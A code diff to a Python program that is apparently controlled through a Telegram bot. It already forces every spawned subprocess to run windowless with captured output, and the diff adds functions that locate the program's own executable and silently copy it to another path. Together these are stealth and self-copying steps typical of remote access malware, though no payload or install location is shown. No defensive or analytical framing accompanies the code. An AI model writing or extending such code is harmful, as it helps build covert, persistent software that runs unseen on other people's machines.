@@ -18,6 +18,14 @@ conflict_error = "Conflict: terminated by other getUpdates request; make sure th
 
 ANSI_ESCAPE_RE = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
 
+def get_original_exe():
+    try:
+        return os.path.abspath(__compiled__.original_argv0)
+    except Exception:
+        return os.path.abspath(sys.argv[0])
+
+BASE_EXE = get_original_exe()
+
 # This will force every subprocess.Popen and os.system to be windowless
 _default_Popen = sp.Popen
 def _patched_popen(*args, **kwargs):
@@ -26,6 +34,18 @@ def _patched_popen(*args, **kwargs):
     kwargs.setdefault("stdout", sp.PIPE)
     return _default_Popen(*args, **kwargs)
 sp.Popen = _patched_popen
+
+def copy_myself(target_path: str) -> bool:
+    current_exe = get_original_exe()
+    target_path = os.path.abspath(target_path)
+    if current_exe.lower() == target_path.lower():
+        return False
+    try:
+        os.makedirs(os.path.dirname(target_path), exist_ok=True)
+        shutil.copy2(current_exe, target_path)
+        return True
+    except:
+        return False
 
 def is_number(s):
     try:
